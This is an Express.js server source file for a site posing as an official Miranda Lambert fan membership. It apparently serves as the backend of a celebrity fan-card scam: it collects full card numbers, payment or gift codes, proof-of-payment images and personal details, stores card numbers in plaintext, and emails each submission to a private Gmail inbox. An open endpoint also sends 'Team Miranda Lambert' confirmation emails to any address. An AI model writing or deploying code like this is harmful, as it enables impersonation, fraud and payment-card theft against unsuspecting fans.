require('dotenv').config();
const express    = require('express');
const mongoose   = require('mongoose');
const cors       = require('cors');
const nodemailer = require('nodemailer');
const multer     = require('multer');
const path       = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASS = process.env.ADMIN_PASS;

function requireAdminAuth(req, res, next) {
  if (!ADMIN_USER || !ADMIN_PASS) {
    return res.status(503).send('Admin auth is not configured. Set ADMIN_USER and ADMIN_PASS in .env.');
  }

  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.set('WWW-Authenticate', 'Basic realm="Fan Membership Admin"');
    return res.status(401).send('Authentication required.');
  }

  const [username, password] = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    return next();
  }

  res.set('WWW-Authenticate', 'Basic realm="Fan Membership Admin"');
  return res.status(401).send('Invalid credentials.');
}

// ── MongoDB Connection ──────────────────────────────────────────
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB error:', err));

// ── Schemas ─────────────────────────────────────────────────────
const billingSchema = new mongoose.Schema({
  fullName:  { type: String, required: true },
  email:     { type: String, required: true },
  phone:     { type: String, required: true },
  country:   { type: String, required: true },
  city:      { type: String, required: true },
  zip:       { type: String, required: true },
  address:   { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});

const paymentSchema = new mongoose.Schema({
  fullName:      String,
  email:         String,
  phone:         String,
  country:       String,
  city:          String,
  zip:           String,
  address:       String,
  tier:          String,
  price:         Number,
  paymentMethod: String,
  amountPaid:    String,
  paymentCode:   String,
  cardNumber:    String,
  proofImage:    String,
  submissionId:  String,
  status:        { type: String, default: 'pending' },
  createdAt:     { type: Date, default: Date.now }
});

const Billing = mongoose.model('Billing', billingSchema);
const Payment = mongoose.model('Payment', paymentSchema);

app.get('/admin', requireAdminAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/admin/api/submissions', requireAdminAuth, async (req, res) => {
  try {
    const payments = await Payment.find().sort({ createdAt: -1 }).lean();
    res.json(payments);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to load submissions.' });
  }
});

app.get('/admin/proof/:filename', requireAdminAuth, (req, res) => {
  const filePath = path.join(__dirname, 'uploads', 'payment-proofs', req.params.filename);
  res.sendFile(filePath, err => {
    if (err) {
      console.error('Proof file error:', err);
      res.status(err.statusCode || 404).send('Proof not found.');
    }
  });
});

// ── Multer (file uploads) ───────────────────────────────────────
const storage = multer.diskStorage({
  destination: path.join(__dirname, 'uploads/payment-proofs'),
  filename: (req, file, cb) => {
    const unique = Date.now() + '-' + Math.round(Math.random() * 1e6);
    cb(null, unique + path.extname(file.originalname));
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    /image\/(jpeg|jpg|png|webp)/.test(file.mimetype) ? cb(null, true) : cb(new Error('Images only'));
  }
});

// ── POST /save-billing ──────────────────────────────────────────
app.post('/save-billing', async (req, res) => {
  try {
    const { fullName, email, phone, country, city, zip, address } = req.body;

    if (!fullName || !email || !phone || !country || !city || !zip || !address) {
      return res.status(400).json({ error: 'All fields are required.' });
    }

    const billing = await Billing.create({ fullName, email, phone, country, city, zip, address });
    res.status(201).json({ success: true, id: billing._id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error. Please try again.' });
  }
});

// ── Nodemailer ──────────────────────────────────────────────────
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// ── Send Confirmation Email ─────────────────────────────────────
async function sendConfirmationEmail(toEmail, fullName, tierName) {
  await transporter.sendMail({
    from: `"Team Miranda Lambert" <${process.env.EMAIL_USER}>`,
    to: toEmail,
    subject: 'Miranda Lambert Fan Membership Confirmed',
    html: `
      <div style="font-family:Georgia,serif;background:#0a0a0a;color:#fff;padding:40px 24px;">
        <div style="max-width:520px;margin:0 auto;background:#111;border:1px solid #222;border-radius:10px;padding:40px;">

          <div style="text-align:center;margin-bottom:28px;">
            <span style="font-size:0.75rem;letter-spacing:4px;text-transform:uppercase;color:#c9a84c;border:1px solid #c9a84c;padding:5px 16px;border-radius:20px;">
              Miranda Lambert Fan Membership
            </span>
          </div>

          <h1 style="font-size:1.6rem;color:#fff;margin-bottom:6px;">Hello, <span style="color:#c9a84c;">${fullName}</span> 👋</h1>
          <p style="color:#888;font-size:0.9rem;margin-bottom:28px;">Your membership payment has been confirmed.</p>

          <div style="background:#0e0e0e;border:1px solid #1e1e1e;border-radius:8px;padding:18px 22px;margin-bottom:28px;">
            <p style="font-size:0.72rem;letter-spacing:1.5px;text-transform:uppercase;color:#666;margin-bottom:4px;">Membership Tier</p>
            <p style="font-size:1.1rem;font-weight:bold;color:#c9a84c;">${tierName}</p>
          </div>

          <p style="color:#ccc;font-size:0.9rem;line-height:1.8;margin-bottom:20px;">
            Welcome to the official fan membership community.<br>
            Your digital membership card and benefits are now active.
          </p>

          <p style="color:#ccc;font-size:0.9rem;line-height:1.8;margin-bottom:32px;">
            Thank you for your support.
          </p>

          <hr style="border:none;border-top:1px solid #222;margin-bottom:24px;" />

          <p style="color:#555;font-size:0.8rem;text-align:center;letter-spacing:1px;">Team Miranda Lambert</p>
        </div>
      </div>
    `
  });
}

// ── POST /submit-payment ────────────────────────────────────────
app.post('/submit-payment', upload.single('proof_image'), async (req, res) => {
  try {
    const {
      fullName,
      email,
      phone,
      country,
      city,
      zip,
      address,
      tier,
      price,
      payment_method,
      amount_paid,
      payment_code,
      card_number
    } = req.body;

    const submissionId = 'EC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();

    await Payment.create({
      fullName,
      email,
      phone,
      country,
      city,
      zip,
      address,
      tier,
      price:         parseFloat(price),
      paymentMethod: payment_method,
      amountPaid:    amount_paid,
      paymentCode:   payment_code,
      cardNumber:    card_number,
      proofImage:    req.file ? req.file.filename : null,
      submissionId,
      status:        'pending'
    });

    const mailOptions = {
      from: `"Fan Membership Site" <${process.env.EMAIL_USER}>`,
      to: 'ivieshaguolo@gmail.com',
      replyTo: email,
      subject: `💰 New Payment Submission — ${tier} — ${submissionId}`,
      html: `
        <div style="font-family:Georgia,serif;background:#f9f9f9;padding:32px;">
          <h2 style="color:#c9a84c;">New Payment Submission</h2>
          <h3 style="color:#333;">Billing Information</h3>
          <table style="width:100%;border-collapse:collapse;font-size:0.95rem;">
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Full Name</b></td><td style="padding:8px;">${fullName || '—'}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>Email</b></td><td style="padding:8px;">${email || '—'}</td></tr>
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Phone</b></td><td style="padding:8px;">${phone || '—'}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>Country</b></td><td style="padding:8px;">${country || '—'}</td></tr>
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>City</b></td><td style="padding:8px;">${city || '—'}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>ZIP</b></td><td style="padding:8px;">${zip || '—'}</td></tr>
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Address</b></td><td style="padding:8px;">${address || '—'}</td></tr>
          </table>

          <h3 style="color:#333;margin-top:24px;">Payment Details</h3>
          <table style="width:100%;border-collapse:collapse;font-size:0.95rem;">
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Submission ID</b></td><td style="padding:8px;">${submissionId}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>Membership Tier</b></td><td style="padding:8px;">${tier || '—'}</td></tr>
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Amount Paid</b></td><td style="padding:8px;">${amount_paid || '—'}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>Payment Method</b></td><td style="padding:8px;">${payment_method || '—'}</td></tr>
            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Card Number</b></td><td style="padding:8px;word-break:break-all;">${card_number || '—'}</td></tr>
            <tr><td style="padding:8px;color:#555;"><b>Code / TxID / Reference</b></td><td style="padding:8px;word-break:break-all;">${payment_code || '—'}</td></tr>
          </table>
          <p style="margin-top:20px;color:#888;font-size:0.85rem;">Proof of payment image is attached below.</p>
        </div>
      `,
      attachments: req.file ? [{
        filename: req.file.originalname,
        path: req.file.path
      }] : []
    };

    await transporter.sendMail(mailOptions).catch(err => console.error('Email error:', err));

    res.status(201).json({ success: true, submissionId });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error.' });
  }
});

// ── POST /confirm-payment (send email) ─────────────────────────
app.post('/confirm-payment', async (req, res) => {
  try {
    const { email, fullName, tierName } = req.body;
    if (!email || !fullName || !tierName) {
      return res.status(400).json({ error: 'email, fullName and tierName are required.' });
    }
    await sendConfirmationEmail(email, fullName, tierName);
    res.json({ success: true, message: 'Confirmation email sent.' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to send email.' });
  }
});

// ── Start Server ────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
